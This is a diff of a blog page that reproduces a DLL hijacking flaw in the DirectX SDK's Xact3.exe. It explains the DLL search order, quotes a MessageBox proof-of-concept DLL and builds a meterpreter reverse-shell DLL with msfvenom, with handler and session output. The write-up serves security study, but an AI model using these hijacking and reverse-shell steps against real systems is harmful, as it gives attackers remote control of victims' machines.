@@ -1,406 +1,130 @@
-<!DOCTYPE html>
-<html lang=""><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现 « 倾旋的博客</title>
-    <meta name="description" content="倾旋的博客">
-    <meta name="author" content='倾旋'>
-
-    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">
-
-    
-    <link rel="stylesheet" href="/sass/researcher.min.css">
-    
-    
-        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
-    
-
-    
-        
-    
-</head>
-
-    <body>
-<input type="checkbox" id="menu-toggle" class="menu-toggle">
-<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
-<nav class="main-nav">
-    
-    <ul>
-    
-        
-        
-            <li><a href="/projects/">Projects</a></li>
-        
-            <li><a href="/links/">Links</a></li>
-        
-            <li><a href="/post/">Posts</a></li>
-        
-            <li><a href="/index.xml">Rss</a></li>
-        
-            <li><a href="/tools/">Tools</a></li>
-        
-    
-    </ul>
-   
-</nav>
-<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
-<div class="container">
-    <h1>Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</h1>
-    <p>本文记录DirectX SDK的DLL劫持漏洞</p>
-        <div class = "toc-wrapper">
-            
-<div class="post-toc" id="post-toc">
-<aside>
-    
-    
-    
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x00-前言">0x00 前言</a></li>
-    <li><a href="#0x01-复现过程">0x01 复现过程</a>
-      <ul>
-        <li><a href="#原理">原理</a></li>
-      </ul>
-    </li>
-    <li><a href="#寻找顺序">寻找顺序：</a>
-      <ul>
-        <li><a href="#寻找过程">寻找过程</a></li>
-      </ul>
-    </li>
-    <li><a href="#0x02-利用过程">0x02 利用过程</a></li>
-    <li><a href="#0x03-总结">0x03 总结</a></li>
-    <li><a href="#0x04-参考">0x04 参考</a></li>
-  </ul>
-</nav>
-    
-    
-</aside>
-<a href="#" id="toc-toggle"></a>
-</div>
-
-
-
-        </div>
-    <h2 id="0x00-前言">0x00 前言</h2>
-<p>Microsoft DirectX SDK (June 2010) Xact3.exe
-<a href="https://www.microsoft.com/en-us/download/details.aspx?id=6812">https://www.microsoft.com/en-us/download/details.aspx?id=6812</a></p>
-<p>目前微软官方已经废弃该SDK，所以我只能本着学习的心态去复现。</p>
-<p>通过参考网上的漏洞披露，我决定复现一下。 这个和之前<a href="http://payloads.online/archivers/2018-06-09/1">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a>的思路差不多。</p>
-<h2 id="0x01-复现过程">0x01 复现过程</h2>
-<p>首先，漏洞披露详情如下：</p>
-<pre tabindex="0"><code>Exploit/POC
+<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现 « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
+<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</h1><p>本文记录DirectX SDK的DLL劫持漏洞</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-复现过程>0x01 复现过程</a><ul><li><a href=#原理>原理</a></li></ul></li><li><a href=#寻找顺序>寻找顺序：</a><ul><li><a href=#寻找过程>寻找过程</a></li></ul></li><li><a href=#0x02-利用过程>0x02 利用过程</a></li><li><a href=#0x03-总结>0x03 总结</a></li><li><a href=#0x04-参考>0x04 参考</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><h2 id=0x00-前言>0x00 前言</h2><p>Microsoft DirectX SDK (June 2010) Xact3.exe
+<a href="https://www.microsoft.com/en-us/download/details.aspx?id=6812">https://www.microsoft.com/en-us/download/details.aspx?id=6812</a></p><p>目前微软官方已经废弃该SDK，所以我只能本着学习的心态去复现。</p><p>通过参考网上的漏洞披露，我决定复现一下。 这个和之前<a href=http://payloads.online/archivers/2018-06-09/1>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a>的思路差不多。</p><h2 id=0x01-复现过程>0x01 复现过程</h2><p>首先，漏洞披露详情如下：</p><pre tabindex=0><code>Exploit/POC
 =============
 1) create DLL 32bit DLL named &#34;xbdm.dll&#34; and place on a remote share
 
 2) create an empty file with a &#34;.xap&#34; extension on the same share, this will open using &#34;Xact3.exe&#34; as its default
 
 3) open the the .xap file from the Network share then BOOM!
-</code></pre><p>一共两步，第一步是创建两个文件，分别是<code>.xap</code>文件和<code>xbdm.dll</code>。</p>
-<p>然后使用<code>Xact3.exe</code>打开，应用程序将会调用<code>xbdm.dll</code>。</p>
-<p><code>Xact3.exe</code>默认路径：</p>
-<ul>
-<li><code>C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Utilities\bin\x86</code></li>
-</ul>
-<h3 id="原理">原理</h3>
-<p>Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
-<p>当程序员在编码的时候未指定DLL绝对路径，应用程序则会在当前目录下寻找DLL。</p>
-<h2 id="寻找顺序">寻找顺序：</h2>
-<ul>
-<li>1.程序所在目录</li>
-<li>2.系统目录即 SYSTEM32 目录</li>
-<li>3.16位系统目录即 SYSTEM 目录</li>
-<li>4.Windows目录</li>
-<li>5.加载 DLL 时所在的当前目录</li>
-<li>6.PATH环境变量中列出的目录</li>
-</ul>
-<h3 id="寻找过程">寻找过程</h3>
-<p>在这里我还是使用<a href="https://docs.microsoft.com/en-gb/sysinternals/downloads/procmon">Process Monitor</a>进行分析：</p>
-<p><strong>设置过滤器</strong></p>
-<blockquote>
-<p>过滤器可以有效的帮我们排除一些不需要关注的信息</p>
-</blockquote>
-<ul>
-<li>Filter &gt; Filter.. &gt; Process Name &gt; &ldquo;Xact3.exe&rdquo;</li>
-</ul>
-<p>这样在创建<code>Xact3.exe</code>进程时，我们的过滤器就会起作用了，会将该进程的所有行为展示出来。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/27fb73d6-4f5f-11ec-b2e1-00d861bf4abb.png" alt="0x01"  />
-  </p></p>
-<p>然后点击“ADD”，将过滤条件生效。</p>
-<p>虽说这样能看到所有的行为，但是还不够精确，需要再加个<code>Result</code>为<code>NAME NOT FOUND</code>的条件。</p>
-<p><strong>查看加载DLL过程</strong></p>
-<p>我先创建一个<code>1.xap</code>：</p>
-<blockquote>
-<p>新建文本文档-&gt;重命名为1.xap</p>
-</blockquote>
-<p>通过<code>Xact3.exe</code>打开，效果如下：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2837fd4c-4f5f-11ec-a0b4-00d861bf4abb.png" alt="0x02"  />
-  </p></p>
-<p>可以看出，该进程在不断寻找<code>xbdm.dll</code>，直接从该进程的物理路径开始寻找，这很大可能存在DLL劫持漏洞。</p>
-<h2 id="0x02-利用过程">0x02 利用过程</h2>
-<p>漏洞作者披露的文章中附带了测试的POC，但是需要编译，我们可以使用MSF直接生成DLL测试。</p>
-<p>作者POC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* hyp3rlinx */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">gcc -c -m32 xbdm.c
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">gcc -shared -m32 -o xbdm.dll xbdm.o
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">executo</span>(){
-</span></span><span style="display:flex;"><span> MessageBox( <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;3c184981367094fce3ab70efc3b44583&#34;</span> , <span style="color:#e6db74">&#34;philbin :)&#34;</span> , MB_YESNO <span style="color:#f92672">+</span> MB_ICONQUESTION );
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>(fdwReason){
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:{
-</span></span><span style="display:flex;"><span> executo();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:{
-</span></span><span style="display:flex;"><span> executo();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:{
-</span></span><span style="display:flex;"><span> executo();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:{
-</span></span><span style="display:flex;"><span> executo();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> TRUE;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>使用MSF生成DLL：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.137.79 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f dll -o /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
-</span></span><span style="display:flex;"><span>No encoder or badchars specified, outputting raw payload
-</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">341</span> bytes
-</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
-</span></span><span style="display:flex;"><span>Saved as: /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
-</span></span></code></pre></div><p>MSF配置：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Exploit target:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Id  Name
-</span></span><span style="display:flex;"><span>   --  ----
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 2.
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.137.79:4444
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</span></span></code></pre></div><p>创建一个<code>.xap</code>文件：</p>
-<pre tabindex="0"><code>touch .xap
-</code></pre><p>打开<code>.xap</code>文件，获得会话：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2876a808-4f5f-11ec-8a46-00d861bf4abb.png" alt="0x03"  />
-  </p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; jobs
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Jobs
-</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  Id  Name                    Payload                          Payload opts
-</span></span><span style="display:flex;"><span>  --  ----                    -------                          ------------
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.137.79:4444
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">179779</span> bytes<span style="color:#f92672">)</span> to 192.168.137.71
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.137.79:4444 -&gt; 192.168.137.71:49236<span style="color:#f92672">)</span> at 2018-08-15 18:31:59 +0800
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">2</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: John-Thunderobt<span style="color:#ae81ff">\J</span>ohn
-</span></span><span style="display:flex;"><span>meterpreter &gt; background
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Exploit target:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Id  Name
-</span></span><span style="display:flex;"><span>   --  ----
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</span></span></code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
-<p>本片文章主要涉及了<code>Process Monitor</code>过滤器的使用，方便快速定位指定进程。</p>
-<p>并且复习了DLL劫持漏洞的原理，及利用方式。</p>
-<h2 id="0x04-参考">0x04 参考</h2>
-<ul>
-<li>
-<p><a href="http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt">http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt</a></p>
-</li>
-<li>
-<p><a href="https://www.exploitalert.com/view-details.html?id=30611">https://www.exploitalert.com/view-details.html?id=30611</a></p>
-</li>
-<li>
-<p><a href="https://hackertor.com/2018/08/13/microsoft-directx-sdk-june-2010-xact3-exe-dll-hijacking/">https://hackertor.com/2018/08/13/microsoft-directx-sdk-june-2010-xact3-exe-dll-hijacking/</a></p>
-</li>
-<li>
-<p>&hellip;.</p>
-</li>
-</ul>
-<p>其实都是一个内容，第一个是作者的文章，有很多不错的漏洞值得学习！</p>
-
-</div>
-<div class="container">
-    <script src="https://giscus.app/client.js"
-    data-repo="Rvn0xsy/rvn0xsy.github.io"
-    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
-    data-category="General"
-    data-category-id="DIC_kwDOF-pTTM4CRDk_"
-    data-mapping="title"
-    data-strict="0"
-    data-reactions-enabled="1"
-    data-emit-metadata="0"
-    data-input-position="bottom"
-    data-theme="dark_tritanopia"
-    data-lang="zh-CN"
-    data-loading="lazy"
-    crossorigin="anonymous"
-    async>
-  </script>
-</div>
-<div class="container">
-    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-    <div class="bio__blurb">
-        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
-        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
-    </div>
-<div class="bio__avatar">
-    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
-</div></section>
-</div>
-
-        </div>
-<footer class="site-footer">
-    <div class="container">
-        <div class="site-footer__col">
-        <h5>Get in touch</h5>
-        <p>
-            If you like my project or have some questions,feel free
-            to contact me</a>.
-        </p>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Me Elsewhere</h5>
-        <ul>
-        
-                <li>
-                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
-                    
-                </li>
-        
-        </ul>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Meta Links</h5>
-        <ul>
-            
-                
-                
-                    <li class="">
-                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
-                    </li>
-                
-            
-        </ul>
-        </div>
-        <p class="site-footer__copyright">
-        © 倾旋 2021. All rights reserved.
-        </p>
-    </div>
-    </footer>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
-<script>
-(function(){
-  let plantumlPrefix = "language-plantuml";
-  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
-    let image = document.createElement("IMG");
-    image.loading = 'lazy'; 
-    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
-    code.parentNode.insertBefore(image, code);
-    code.style.display = 'none';
-  });
-})();
-</script>
-
-</body>
-</html>
+</code></pre><p>一共两步，第一步是创建两个文件，分别是<code>.xap</code>文件和<code>xbdm.dll</code>。</p><p>然后使用<code>Xact3.exe</code>打开，应用程序将会调用<code>xbdm.dll</code>。</p><p><code>Xact3.exe</code>默认路径：</p><ul><li><code>C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Utilities\bin\x86</code></li></ul><h3 id=原理>原理</h3><p>Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p><p>当程序员在编码的时候未指定DLL绝对路径，应用程序则会在当前目录下寻找DLL。</p><h2 id=寻找顺序>寻找顺序：</h2><ul><li>1.程序所在目录</li><li>2.系统目录即 SYSTEM32 目录</li><li>3.16位系统目录即 SYSTEM 目录</li><li>4.Windows目录</li><li>5.加载 DLL 时所在的当前目录</li><li>6.PATH环境变量中列出的目录</li></ul><h3 id=寻找过程>寻找过程</h3><p>在这里我还是使用<a href=https://docs.microsoft.com/en-gb/sysinternals/downloads/procmon>Process Monitor</a>进行分析：</p><p><strong>设置过滤器</strong></p><blockquote><p>过滤器可以有效的帮我们排除一些不需要关注的信息</p></blockquote><ul><li>Filter > Filter.. > Process Name > &ldquo;Xact3.exe&rdquo;</li></ul><p>这样在创建<code>Xact3.exe</code>进程时，我们的过滤器就会起作用了，会将该进程的所有行为展示出来。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/27fb73d6-4f5f-11ec-b2e1-00d861bf4abb.png alt=0x01></p></p><p>然后点击“ADD”，将过滤条件生效。</p><p>虽说这样能看到所有的行为，但是还不够精确，需要再加个<code>Result</code>为<code>NAME NOT FOUND</code>的条件。</p><p><strong>查看加载DLL过程</strong></p><p>我先创建一个<code>1.xap</code>：</p><blockquote><p>新建文本文档->重命名为1.xap</p></blockquote><p>通过<code>Xact3.exe</code>打开，效果如下：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2837fd4c-4f5f-11ec-a0b4-00d861bf4abb.png alt=0x02></p></p><p>可以看出，该进程在不断寻找<code>xbdm.dll</code>，直接从该进程的物理路径开始寻找，这很大可能存在DLL劫持漏洞。</p><h2 id=0x02-利用过程>0x02 利用过程</h2><p>漏洞作者披露的文章中附带了测试的POC，但是需要编译，我们可以使用MSF直接生成DLL测试。</p><p>作者POC：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* hyp3rlinx */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -c -m32 xbdm.c
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -shared -m32 -o xbdm.dll xbdm.o
+</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>executo</span>(){
+</span></span><span style=display:flex><span> MessageBox( <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;3c184981367094fce3ab70efc3b44583&#34;</span> , <span style=color:#e6db74>&#34;philbin :)&#34;</span> , MB_YESNO <span style=color:#f92672>+</span> MB_ICONQUESTION );
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span>(fdwReason){
+</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:{
+</span></span><span style=display:flex><span> executo();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:{
+</span></span><span style=display:flex><span> executo();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:{
+</span></span><span style=display:flex><span> executo();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:{
+</span></span><span style=display:flex><span> executo();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> TRUE;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>使用MSF生成DLL：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.137.79 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -f dll -o /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style=display:flex><span>No encoder or badchars specified, outputting raw payload
+</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>341</span> bytes
+</span></span><span style=display:flex><span>Final size of dll file: <span style=color:#ae81ff>5120</span> bytes
+</span></span><span style=display:flex><span>Saved as: /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
